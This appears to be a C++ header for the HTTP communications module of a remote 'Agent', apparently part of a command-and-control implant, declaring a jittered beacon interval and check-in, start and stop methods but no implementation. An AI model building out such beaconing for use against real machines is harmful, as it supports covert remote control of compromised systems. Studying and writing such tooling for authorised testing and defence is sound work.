#include <string>
#include <atomic>
#include <random>
#include "HttpClient.h"
#include "Agent.h"

// Base beacon interval and ±jitter range (milliseconds).
static constexpr DWORD BEACON_INTERVAL_MS = 5000;
static constexpr DWORD BEACON_JITTER_MS   = 1000;

class HTTPCommunicationModule {
	private:
		Agent& agent;
		std::string Address;
		int Port;
		HttpClient httpClient;
		std::vector<std::wstring> headers;
		std::atomic<bool> running;
		HANDLE hStopEvent;
		std::mt19937 rng;

		DWORD nextSleepMs();

	public:
		HTTPCommunicationModule(const std::string& address, int port, Agent& agent);
		~HTTPCommunicationModule();

		virtual void Config();

		virtual void Start();

		virtual void Stop();

		virtual void Checkin();
};
